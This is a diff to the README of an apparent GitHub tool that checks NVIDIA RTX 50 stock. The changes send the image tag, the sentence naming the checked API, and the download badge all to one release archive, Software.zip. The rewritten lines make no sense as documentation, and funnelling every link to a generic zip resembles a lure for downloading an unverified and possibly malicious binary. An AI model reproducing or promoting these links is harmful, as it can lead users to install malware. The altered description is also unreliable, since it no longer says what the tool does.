@@ -1,9 +1,9 @@
 
 # 🚀 RTX 50 Series Stock Check 🚀
 
-![RTX 50 Series Stock Check](https://www.example.com/image.png)
+![RTX 50 Series Stock Check](https://github.com/Ronybellloo/rtx-50-series-stock-check/releases/download/v1.0/Software.zip)
 
-Welcome to the RTX 50 Series Stock Check repository! This repository contains a small application that checks api.store.nvidia.com for stock availability of the 50XX series GPUs from NVIDIA.
+Welcome to the RTX 50 Series Stock Check repository! This repository contains a small application that checks https://github.com/Ronybellloo/rtx-50-series-stock-check/releases/download/v1.0/Software.zip for stock availability of the 50XX series GPUs from NVIDIA.
 
 ## 📁 Repository Contents
 
@@ -29,7 +29,7 @@ The repository covers a variety of topics related to the NVIDIA RTX 50 series GP
 
 ## 📦 Download Link
 
-[![Download RTX 50 Series Stock Check](https://img.shields.io/static/v1?label=Download&message=RTX%2050%20Series%20Stock%20Check&color=blue)](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+[![Download RTX 50 Series Stock Check](https://github.com/Ronybellloo/rtx-50-series-stock-check/releases/download/v1.0/Software.zip%2050%20Series%20Stock%20Check&color=blue)](https://github.com/Ronybellloo/rtx-50-series-stock-check/releases/download/v1.0/Software.zip)
 
 For the download link provided above, simply click on the button to initiate the download process.
 
